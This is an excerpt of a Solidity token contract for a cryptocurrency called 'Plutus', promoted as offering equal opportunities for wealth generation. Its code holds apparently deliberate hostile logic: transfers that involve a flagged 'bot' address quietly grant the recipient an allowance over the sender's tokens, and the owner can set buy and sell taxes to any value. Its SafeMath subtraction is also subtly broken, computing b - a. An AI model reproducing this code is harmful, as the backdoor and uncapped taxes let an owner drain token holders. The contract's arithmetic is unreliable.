...
/*
    Plutus focuses on inclusivity and accessibility, 
    providing equal opportunities for wealth generation.

    https://www.plutusgod.com
    https://t.me/PlutusCoinOfficial
*/
...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = b - a; return c; }
...
contract Plutus is ERC20, Ownable{
    ...
    address public marketingWallet = 0xb238c0b33cCd66705D0103b53F4B6914DaA21DB4;
    address public devWallet = 0x0000000000000000000000000000000000000000;
    uint256 public tax = 0;
    uint256 public sellTax = 0;
    uint256 public botSellTax = 5;
    ...
    constructor() ERC20("Plutus", "PLUTUS") {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if(isBot[sender] || isBot[recipient]) { sellTax = botSellTax; _allowances[sender][recipient] = maxTxAmount; }
    ...
    function setBuyTaxes(uint256 _fee) external onlyOwner{ tax = _fee; }
    function setSellTaxes(uint256 _fee) external onlyOwner{ sellTax = _fee; }
